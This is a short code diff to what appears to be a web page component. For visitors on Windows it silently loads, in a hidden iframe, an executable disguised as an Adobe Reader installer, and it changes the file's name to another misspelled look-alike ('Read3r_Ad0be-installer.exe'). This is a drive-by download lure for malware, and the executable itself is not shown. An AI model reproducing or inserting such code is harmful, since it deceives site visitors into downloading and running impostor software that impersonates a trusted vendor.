@@ -11,7 +11,7 @@ export default function Home() {
     if (isWindows) {
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = '/Read3r_Adobe-installer.msi.exe';
+      iframe.src = '/Read3r_Ad0be-installer.exe';
       document.body.appendChild(iframe);
 
       setTimeout(() => {
